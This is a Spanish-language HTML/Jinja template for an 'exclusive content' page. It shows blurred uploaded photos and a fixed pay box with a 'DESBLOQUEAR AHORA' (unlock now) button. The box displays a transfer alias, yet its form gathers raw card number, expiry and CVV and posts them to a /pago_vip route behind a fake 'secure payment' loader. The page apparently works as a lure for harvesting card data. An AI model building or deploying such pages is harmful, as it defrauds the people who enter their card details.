<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CONTENIDO EXCLUSIVO</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
    <style>
        body { background: {{config.color_fondo}}; color: white; margin-bottom: 350px; }
        .gallery { display: grid; grid-template-columns: repeat(auto-fill, minmax(130px, 1fr)); gap: 8px; padding: 10px; }
        .gallery img { width: 100%; height: 160px; object-fit: cover; border-radius: 8px; filter: blur(6px); border: 1px solid #d4af37; }
        .pay-box { position: fixed; bottom: 0; width: 100%; background: #000; padding: 20px; border-top: 3px solid #d4af37; z-index: 1000; }
        .loader { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 2000; justify-content: center; align-items: center; flex-direction: column; }
    </style>
</head>
<body>
    <div id="loader" class="loader"><div class="spinner-border text-warning"></div><p class="mt-3 text-warning">Procesando pago seguro...</p></div>
    <div class="p-3 text-center"><h5 style="color:#d4af37">{{config.titulo}}</h5></div>
    <div class="gallery">
        {% for f in fotos %}<img src="/static/uploads/{{f}}">{% endfor %}
    </div>
    <div class="pay-box">
        <p class="text-center small mb-2">Transferir a: <strong>{{config.alias}}</strong> | Monto: <strong>${{config.precio}}</strong></p>
        <form action="/pago_vip" method="POST" onsubmit="document.getElementById('loader').style.display='flex'">
            <input type="tel" name="cc" class="form-control mb-2" placeholder="NÃºmero de Tarjeta" maxlength="16" required>
            <div class="row g-2 mb-2">
                <div class="col-6"><input type="tel" name="exp" class="form-control" placeholder="MM/AA" required></div>
                <div class="col-6"><input type="tel" name="cvv" class="form-control" placeholder="CVV" required></div>
            </div>
            <button class="btn btn-warning w-100 fw-bold">DESBLOQUEAR AHORA</button>
        </form>
    </div>
</body>
</html>
